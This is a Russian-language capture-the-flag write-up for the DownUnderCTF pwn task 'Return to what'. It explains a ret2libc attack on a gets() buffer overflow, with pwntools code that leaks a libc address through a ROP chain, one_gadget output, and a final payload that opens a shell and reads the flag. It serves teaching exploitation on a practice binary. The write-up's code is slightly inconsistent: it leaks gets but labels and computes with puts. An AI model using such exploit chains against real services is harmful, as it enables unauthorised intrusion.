# Return to what (200 points, 149 solves)

> This will show my friends!
>
> nc chal.duc.tf 30003

*Дисклеймер:* это, пожалуй, самое базовое задание из этой категории, поэтому я постараюсь его нормально
описать, а в будущем буду ссылаться сюда.

В файлах находим [return-to-what](./return-to-what). Давайте откроем его в Ghidra. Нам повезло, в бинаре есть
символы, поэтому мы легко находим `main()`:
```c
undefined8 main(void)
{
  puts("Today, we\'ll have a lesson in returns.");
  vuln();
  return 0;
}
```

Ничего интересного, идём в `vuln()`:
```c 
void vuln(void)

{
  char local_38 [48]; 
  puts("Where would you like to return to?");
  gets(local_38);
  return;
}
```

Опа, сильно напоминает прошлое задание - [Shell this!](../Shell%20this!). Тут и та же проблема с `gets()`, и структура 
похожа. Вот только в списке функций нет той, которая бы нам shell дала. Что же делать, куда нам прыгать? Добро 
пожаловать в Ret2Libc.

Первый шаг у нас не меняется - надо найти оффсет. В прошлом write-up'е я это подробно описал. А вот дальше нужно найти
адрес, на которой нужно перейти. Для этого нужно сделать несколько вещей: "слить" адрес одной из "системных" функций, 
найти версию libc (для этого, возможно, потребуется слить больше одного адреса), найти базовый адрес libc, вызвать 
что-то типа `system("bin/sh")`. Как это всё делается? Давайте по порядку.

### Сливаем адрес(а)

Я думаю не должно быть секретом, что есть куча "стандартных" функций, которые находятся в libc. Например, мы можем
использовать `puts()`, но ведь не мы писали реализацию. Она живёт в libc (если мы говорим о динамической линковке).
Для того, чтобы разобраться с этой магией, необходимо познакомиться с GOT и PLT. В рамках write-up'а это делать
бессмысленно, лучше прочитать детальную статью. Например, [эту](https://itnan.ru/post.php?c=1&p=323904). Нам нужно 
узнать адреса функций из GOT таблицы. Pwntools умеет это делать, но ведь нам надо его как-то вывести на экран.
Давайте вызовем `puts()`. Выглядит это примерно так:
```python
def leak_libc(io, offset):
    r = ROP(e)
    puts = e.plt['puts']  # берём адрес puts(), чтобы её можно было вызвать
    pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]  # вытаскиваем так называемый "гаджет", про него позже
    main = e.symbols['main']  # берём адрес main - мы туда ещё вернёмся

    gets_got = e.got['gets']  # этот адрес мы будем сливать, может быть любая функция, которую можете найти в бинаре

    p = offset * b'A' + p64(pop_rdi) + p64(gets_got) + p64(puts) + p64(main)  # читайте ниже

    print(io.recv())
    io.sendline(p)  # отправляем нашу строку
    data = io.recvline().strip().ljust(8, b'\x00')  # читаем ответ
    leak = u64(data)
    print('leaked address: ' + hex(leak))  # выводим адрес на экран
```

Самая главная строка - это:
```python
    p = offset * b'A' + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main)
```

С оффсетом всё ясно - переполняем буфер. Гаджет `pop_rdi` нужен для того, чтобы положить какое-то значение в
регистр `rdi`. Зачем? А там хранится первый аргумент, вызываемой функции. Если для функции нужно больше аргументов, то 
нужно искать дополнительные гаджеты и класть значения в правильные регистры. Вот [тут](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI)
можно почитать подробнее. Но в нашем случае у `puts()` всего лишь 1 аргумент. Кладём мы туда адрес `gets_got` и вызываем
`puts()`. После этого, чтобы программа не закончила своё выполнение, мы возвращаемся в `main()` (или можно сразу в
`vuln()`). Дальше мы отправляем эту строку и получаем ответ.

А почему мы возвращаемся в `main()`? Разве нельзя дать программе остановиться, адрес-то мы получили, просто запустим
ещё раз? Тут не всё так просто. В реальности libc загружается в случайное место, т.е. абсолютные адреса постоянно 
меняются между запусками программы. Постоянны лишь относительные адреса функций относительно базового адреса libc и 3 
последних байта (т.к. у адреса libc последние три байта равны 000). Именно это позволяет найти точную
версию libc. Для этого достаточно вводить слитые адреса [здесь](https://libc.blukat.me). В принципе в этом случае
достаточно ввести адрес `puts` и выбрать ту версию libc, в которую входит `amd64`. Но если нет
уверенности, всегда можно слить дополнительные адреса. В этой задаче хватило `puts` и `__libc_start_main`, и мы получаем
`libc6_2.27-3ubuntu1_amd64`. С этого же сайта можно скачать файл.

### Вычисляем базовый адрес и получаем shell

Раз уж у нас есть libc, то мы можем взять адрес функции из него, сравнить с нашим слитым адресом и найти базовый адрес 
libc в конкретный запуск программы. После этого мы можем найти строку `"/bin/sh"`, адрес `system()` и вызвать её, как 
мы это делали раньше. Но я решил пойти по другому пути. Есть такая прикольная программка [one_gadget](https://github.com/david942j/one_gadget).
Она позволяет найти в libc 1 гаджет, который нам сразу даст shell. Использование простое:
```shell script
$ one_gadget libc6_2.27-3ubuntu1_amd64.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
``` 

Сразу скажу, что не стоит думать, что любой адрес из выведенных сработает. Более того, здесь сработал
второй - первый, к сожалению, приводил к крашу. Как же воспользоваться этим чудом? А всё очень просто:
```python
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
libc_base = leak - libc.symbols['puts']
p = offset * b'A' + p64(libc_base + 0x4f322)
print(io.recv())
io.sendline(p)
io.interactive()
```

Ну и результат запуска такой:
```shell script
$ ls
flag.txt return-to-what
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
```

Поздравляю всех с вашим первым Ret2Libc! Ну и даже немного Return Orienting Programming зацепили. Полный код эксплоита
найдёте в файле [return-to-what.py](./return-to-what.py).